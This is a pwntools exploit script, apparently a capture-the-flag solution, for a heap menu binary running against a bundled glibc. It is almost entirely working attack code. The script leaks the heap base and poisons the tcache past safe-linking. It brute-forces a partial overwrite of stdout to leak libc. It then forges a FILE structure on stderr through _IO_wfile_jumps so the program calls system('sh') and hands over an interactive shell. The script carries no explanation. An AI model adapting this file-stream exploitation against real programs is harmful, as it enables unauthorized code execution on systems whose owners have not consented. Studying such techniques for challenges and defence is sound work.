from pwn import *

elf = ELF("./main_patched")
libc = ELF("./libc")
ld = ELF("./ld")

context.binary = elf
context.terminal = ['konsole', '-e']

# gdb.attach(p,"""
# set glibc 2.41
# """)

def create(idx, size):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())

def delete(idx):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', data)

while True:
    try:
        p = process()
        p.recvuntil(b': ')
        heap_base = int(p.recvline(), 16) - 672

        create(0, 0x20)
        create(1, 0x20)
        create(6, 0x90)

        delete(0)
        delete(1)

        addr = heap_base + 864

        # Chunk within the chunks variable (index 6)
        edit(1, pack((addr >> 12) ^ (heap_base + 656+0x40)))

        create(0, 0x20)
        create(0, 0x20)
        edit(0, pack(0xdeadbeef))

        create(1, 0x20)
        create(2, 0x20)

        delete(1)
        delete(2)

        edit(2, pack((addr >> 12) ^ (heap_base + 656+0x40-0x10)))
        create(1, 0x20)
        create(1, 0x20)
        edit(1, pack(0) + pack(0x461))

        for i in range((0x460 // 0x30) - 8):
            create(1, 0x20)

        delete(0)
        target = ((libc.symbols['_IO_2_1_stdout_']) + 0xb000)  & 0xffff
        edit(0, p16(target))
        payload = pack(0xfbad1887) + pack(0) * 3 + p8(0)
        edit(6, payload)

        # Trigger fsop
        p.sendlineafter(b'>> ', b'4')

        libc_leak = u64(p.recv(8)) - libc.symbols['_IO_2_1_stdout_'] - 132
        print(hex(libc_leak))
        if(libc_leak != 0x207327657246d230):
            break
    except:
        pass

edit(0, p64(libc_leak + libc.symbols['main_arena'] + 96))
for i in range(0x460 // 0x30):
    create(4, 0x20)

fsbase = libc_leak - 10432

edit(0, p64(libc_leak + libc.symbols['_IO_2_1_stderr_']))
edit(6, flat({
    0: b'  sh',
    0x20: 0,
    0x28: 1,
}, filler=b'\x00'))
edit(0, p64(libc_leak + libc.symbols['_IO_2_1_stderr_'] + 0x90))
edit(6, flat({
    0xa0 - 0x90: libc_leak + 2005952,
    0xd8 - 0x90: libc.symbols['_IO_wfile_jumps'] + libc_leak,
}, filler=b'\x00'))

edit(0, p64(libc_leak + 2005952 + 0x90))
edit(6, flat({
    0x68: libc.symbols['system'] + libc_leak,
    0xe0-0x90: libc_leak + 2005952 + 0x90,
}, filler=b'\x00'))

edit(0, p64(fsbase+0x308))
edit(6, p64(8))
edit(0, p64(libc.symbols['__libc_single_threaded_internal'] + libc_leak))
edit(6, p64(0))

p.interactive()